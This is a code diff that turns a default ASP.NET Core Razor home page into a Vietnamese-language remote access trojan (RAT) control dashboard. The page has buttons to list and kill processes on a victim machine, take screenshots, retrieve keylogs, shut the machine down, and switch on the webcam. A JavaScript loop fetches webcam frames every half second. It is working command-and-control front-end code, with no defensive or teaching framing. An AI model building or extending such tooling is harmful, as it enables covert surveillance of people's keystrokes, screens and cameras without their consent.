@@ -1,8 +1,75 @@
 ﻿@{
-    ViewData["Title"] = "Home Page";
+    ViewData["Title"] = "RAT Dashboard";
 }
 
-<div class="text-center">
-    <h1 class="display-4">Welcome</h1>
-    <p>Learn about <a href="https://learn.microsoft.com/aspnet/core">building Web apps with ASP.NET Core</a>.</p>
+<div class="container text-center">
+    <h1 class="mb-4">TRUNG TÂM ĐIỀU KHIỂN RAT (FULL)</h1>
+
+    <div class="row">
+        <div class="col-md-4">
+            <div class="d-grid gap-2">
+                <button onclick="cmd('LIST')" class="btn btn-primary">1. Danh sách App</button>
+                <div class="input-group">
+                    <input type="text" id="pid" class="form-control" placeholder="PID hoặc Tên">
+                    <button onclick="cmd('START|'+$('#pid').val())" class="btn btn-success">Mở</button>
+                    <button onclick="cmd('STOP|'+$('#pid').val())" class="btn btn-danger">Tắt</button>
+                </div>
+                <button onclick="cmd('SCREENSHOT')" class="btn btn-warning">3. Chụp Màn Hình</button>
+                <button onclick="cmd('KEYLOG')" class="btn btn-info">4. Lấy Keylog</button>
+                <button onclick="cmd('SHUTDOWN')" class="btn btn-dark">5. Tắt máy</button>
+
+                <hr />
+                <button onclick="cmd('WEBCAM_ON'); startLoop();" class="btn btn-danger">6. BẬT WEBCAM</button>
+                <button onclick="cmd('WEBCAM_OFF'); stopLoop();" class="btn btn-secondary">TẮT WEBCAM</button>
+            </div>
+        </div>
+
+        <div class="col-md-8">
+            <textarea id="log" class="form-control mb-3" rows="5" placeholder="Log text..."></textarea>
+
+            <div style="border: 2px solid #333; min-height: 300px; background: #000;">
+                <img id="imgView" style="max-width: 100%; display:none;" />
+                <p id="camStatus" class="text-white mt-5">Camera chưa bật</p>
+            </div>
+        </div>
+    </div>
 </div>
+
+@section Scripts {
+    <script>
+        var camInterval = null;
+
+        function cmd(command) {
+            if (command !== "WEBCAM_GET") {
+                $("#log").val("Đang gửi: " + command + "...");
+            }
+
+            $.post("/Home/Send", { cmd: command }, function (res) {
+                if (res.status === "ok") {
+                    var data = res.data;
+                    if (data.length > 1000 && !data.includes(" ")) {
+                        $("#imgView").attr("src", "data:image/jpeg;base64," + data).show();
+                        $("#camStatus").hide();
+                    } else {
+                        if (command !== "WEBCAM_GET") { 
+                            $("#log").val(data);
+                        }
+                    }
+                }
+            });
+        }
+        function startLoop() {
+            $("#log").val("Đang kết nối Camera...");
+            if (camInterval) clearInterval(camInterval);
+            camInterval = setInterval(function() {
+                cmd('WEBCAM_GET');
+            }, 500);
+        }
+
+        function stopLoop() {
+            if (camInterval) clearInterval(camInterval);
+            $("#imgView").hide();
+            $("#camStatus").show().text("Camera đã tắt");
+        }
+    </script>
+}
